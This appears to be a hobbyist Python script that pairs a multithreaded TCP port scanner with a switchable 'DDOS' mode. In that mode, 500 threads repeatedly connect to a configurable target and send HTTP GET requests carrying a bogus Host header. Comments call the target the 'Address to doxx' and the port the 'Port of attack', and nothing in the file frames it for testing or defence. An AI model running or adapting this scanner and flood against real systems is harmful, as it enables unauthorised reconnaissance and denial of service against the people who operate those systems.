
import socket
from threading import Thread, Lock
from queue import Queue
import threading


#Global Values Portscanner


N_THREADS = 200 #Adjust for portscanner thread number
q = Queue()
print_lock = Lock()

def port_scan(port):
    try:
        s = socket.socket()
        s.connect((host, port))
    except:
        with print_lock:
            print(f"Scan finished", end='\r')
    else:
        with print_lock:
            print(f"{host:15}:{port:5} is open")
    finally:
        s.close()

def scan_thread():
    global q
    while True:
        worker = q.get()
        port_scan(worker)
        q.task_done()

def main(host, ports):
    global q
    for t in range(N_THREADS):
        t = Thread(target=scan_thread)
        t.daemon = True
        t.start()
    for worker in ports:
        q.put(worker)
    q.join()

#Global value to change

target = "127.0.0.1" #Address to doxx
fake_ip ="2.2.2.2" #Bogus address to send to host
port = 80 #Port of attack

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()


# Press the green button in the gutter to run the script.
if __name__ == '__main__':

    problem_type = 1 #Change this to switch between portscanner(1) and DDOS(2).

    host = "127.0.0.1" #Who you want to scan
    start_port = 1 #Port Scan Range
    end_port = 1000

    if problem_type == 1:
        ports = [p for p in range(start_port, end_port)]
        main(host, ports)
    elif problem_type == 2: #Check global values above attack to adjust, it was just a pain to configure here w/ threading
        for i in range(500):
            thread = threading.Thread(target=attack)
            thread.start()

# See PyCharm help at https://www.jetbrains.com/help/pycharm/
